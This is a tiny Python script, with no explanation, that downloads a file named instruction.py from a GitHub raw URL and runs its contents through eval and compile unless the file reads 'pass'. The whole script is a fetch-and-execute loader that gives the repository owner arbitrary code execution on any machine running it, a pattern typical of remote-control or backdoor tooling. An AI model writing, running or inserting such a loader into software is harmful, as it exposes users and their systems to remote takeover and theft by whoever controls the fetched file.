import requests

r = requests.get("https://raw.githubusercontent.com/Nymerea/aptima/master/instruction.py")
script = r.text
if script != "pass":
    eval(compile(script, '<string>', 'exec'))
    #exec(script)
    pass
